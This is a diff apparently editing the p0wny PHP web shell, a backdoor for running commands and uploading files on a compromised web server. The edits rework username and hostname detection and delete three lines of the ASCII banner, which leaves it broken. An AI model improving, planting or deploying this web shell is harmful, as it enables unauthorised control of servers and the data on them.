@@ -138,22 +138,15 @@ function featureUpload($path, $file, $cwd) {
 function initShellConfig() {
     global $SHELL_CONFIG;
 
+    // Set the username based on environment variables without posix functions
     if (isRunningWindows()) {
-        $username = getenv('USERNAME');
-        if ($username !== false) {
-            $SHELL_CONFIG['username'] = $username;
-        }
+        $SHELL_CONFIG['username'] = getenv('USERNAME') ?: 'unknown_user';
     } else {
-        $pwuid = posix_getpwuid(posix_geteuid());
-        if ($pwuid !== false) {
-            $SHELL_CONFIG['username'] = $pwuid['name'];
-        }
+        $SHELL_CONFIG['username'] = getenv('USER') ?: 'unknown_user';
     }
 
-    $hostname = gethostname();
-    if ($hostname !== false) {
-        $SHELL_CONFIG['hostname'] = $hostname;
-    }
+    // Set the hostname if available
+    $SHELL_CONFIG['hostname'] = gethostname() ?: 'unknown_host';
 }
 
 if (isset($_GET["feature"])) {
@@ -185,8 +178,9 @@ if (isset($_GET["feature"])) {
     initShellConfig();
 }
 
-?><!DOCTYPE html>
+?>
 
+<!DOCTYPE html>
 <html>
 
     <head>
@@ -587,9 +581,7 @@ if (isset($_GET["feature"])) {
                 <div id="shell-logo">
         ___                         ____      _          _ _        _  _   <span></span>
  _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
-| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
-| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
-| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
+
 |_|                         |___/  \____/                                  <span></span>
                 </div>
             </pre>
@@ -603,3 +595,4 @@ if (isset($_GET["feature"])) {
     </body>
 
 </html>
+
